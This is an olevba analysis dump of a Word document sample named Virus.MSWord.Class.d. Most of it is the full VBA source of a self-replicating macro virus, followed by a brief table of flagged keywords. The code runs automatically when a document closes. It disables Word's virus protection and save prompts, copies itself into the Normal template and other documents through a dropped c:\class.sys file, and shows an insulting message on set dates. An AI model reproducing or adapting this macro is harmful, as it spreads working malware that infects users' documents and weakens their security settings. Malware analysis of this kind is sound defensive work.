olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-db2a1d641907807c1efb8d0f7649005800f42ab5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-db2a1d641907807c1efb8d0f7649005800f42ab5 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'Ditry PC1/1/99 10:04:45 AMHP LaserJet 4 on LPT1:W7CLAS-D.VOC
On Error GoTo out
'Ditry PC1/1/99 10:04:45 AMHP LaserJet 4 on LPT1:W7CLAS-D.VOC
Options.VirusProtection = False
'Ditry PC1/1/99 10:04:45 AMHP LaserJet 4 on LPT1:W7CLAS-D.VOC
Options.SaveNormalPrompt = False
'Ditry PC1/1/99 10:04:45 AMHP LaserJet 4 on LPT1:W7CLAS-D.VOC
Options.ConfirmConversions = False
'Ditry PC1/1/99 10:04:45 AMHP LaserJet 4 on LPT1:W7CLAS-D.VOC
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Ditry PC1/1/99 10:04:45 AMHP LaserJet 4 on LPT1:W7CLAS-D.VOC
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Ditry PC1/1/99 10:04:45 AMHP LaserJet 4 on LPT1:W7CLAS-D.VOC
If nt > 70 And ad > 0 Then GoTo out
'Ditry PC1/1/99 10:04:45 AMHP LaserJet 4 on LPT1:W7CLAS-D.VOC
If nt < 70 Then
'Ditry PC1/1/99 10:04:45 AMHP LaserJet 4 on LPT1:W7CLAS-D.VOC
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Ditry PC1/1/99 10:04:45 AMHP LaserJet 4 on LPT1:W7CLAS-D.VOC
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Ditry PC1/1/99 10:04:45 AMHP LaserJet 4 on LPT1:W7CLAS-D.VOC
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Ditry PC1/1/99 10:04:45 AMHP LaserJet 4 on LPT1:W7CLAS-D.VOC
End If
'Ditry PC1/1/99 10:04:45 AMHP LaserJet 4 on LPT1:W7CLAS-D.VOC
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Ditry PC1/1/99 10:04:45 AMHP LaserJet 4 on LPT1:W7CLAS-D.VOC
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'Ditry PC1/1/99 10:04:45 AMHP LaserJet 4 on LPT1:W7CLAS-D.VOC
host.codemodule.AddFromFile ("c:\class.sys")
'Ditry PC1/1/99 10:04:45 AMHP LaserJet 4 on LPT1:W7CLAS-D.VOC
With host.codemodule
'Ditry PC1/1/99 10:04:45 AMHP LaserJet 4 on LPT1:W7CLAS-D.VOC
    For x = 1 To 4
'Ditry PC1/1/99 10:04:45 AMHP LaserJet 4 on LPT1:W7CLAS-D.VOC
    .deletelines 1
'Ditry PC1/1/99 10:04:45 AMHP LaserJet 4 on LPT1:W7CLAS-D.VOC
    Next x
'Ditry PC1/1/99 10:04:45 AMHP LaserJet 4 on LPT1:W7CLAS-D.VOC
End With
'Ditry PC1/1/99 10:04:45 AMHP LaserJet 4 on LPT1:W7CLAS-D.VOC
If nt < 70 Then
'Ditry PC1/1/99 10:04:45 AMHP LaserJet 4 on LPT1:W7CLAS-D.VOC
    With host.codemodule
'Ditry PC1/1/99 10:04:45 AMHP LaserJet 4 on LPT1:W7CLAS-D.VOC
    .replaceline 1, "Sub AutoClose()"
'Ditry PC1/1/99 10:04:45 AMHP LaserJet 4 on LPT1:W7CLAS-D.VOC
    .replaceline 91, "Sub ToolsMacro()"
'Ditry PC1/1/99 10:04:45 AMHP LaserJet 4 on LPT1:W7CLAS-D.VOC
    For x = 70 To 81
'Ditry PC1/1/99 10:04:45 AMHP LaserJet 4 on LPT1:W7CLAS-D.VOC
        .deletelines 62
'Ditry PC1/1/99 10:04:45 AMHP LaserJet 4 on LPT1:W7CLAS-D.VOC
    Next x
'Ditry PC1/1/99 10:04:45 AMHP LaserJet 4 on LPT1:W7CLAS-D.VOC
    .replaceline 35, "    For x = 1 To 4"
'Ditry PC1/1/99 10:04:45 AMHP LaserJet 4 on LPT1:W7CLAS-D.VOC
    End With
'Ditry PC1/1/99 10:04:45 AMHP LaserJet 4 on LPT1:W7CLAS-D.VOC
End If
'Ditry PC1/1/99 10:04:45 AMHP LaserJet 4 on LPT1:W7CLAS-D.VOC
With host.codemodule
'Ditry PC1/1/99 10:04:45 AMHP LaserJet 4 on LPT1:W7CLAS-D.VOC
    For x = 2 To 104 Step 2
'Ditry PC1/1/99 10:04:45 AMHP LaserJet 4 on LPT1:W7CLAS-D.VOC
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Ditry PC1/1/99 10:04:45 AMHP LaserJet 4 on LPT1:W7CLAS-D.VOC
    Next x
'Ditry PC1/1/99 10:04:45 AMHP LaserJet 4 on LPT1:W7CLAS-D.VOC
End With
'Ditry PC1/1/99 10:04:45 AMHP LaserJet 4 on LPT1:W7CLAS-D.VOC
out:
'Ditry PC1/1/99 10:04:45 AMHP LaserJet 4 on LPT1:W7CLAS-D.VOC
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Ditry PC1/1/99 10:04:45 AMHP LaserJet 4 on LPT1:W7CLAS-D.VOC
End Sub
'Ditry PC1/1/99 10:04:45 AMHP LaserJet 4 on LPT1:W7CLAS-D.VOC
Sub ToolsMacro()
'Ditry PC1/1/99 10:04:45 AMHP LaserJet 4 on LPT1:W7CLAS-D.VOC
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

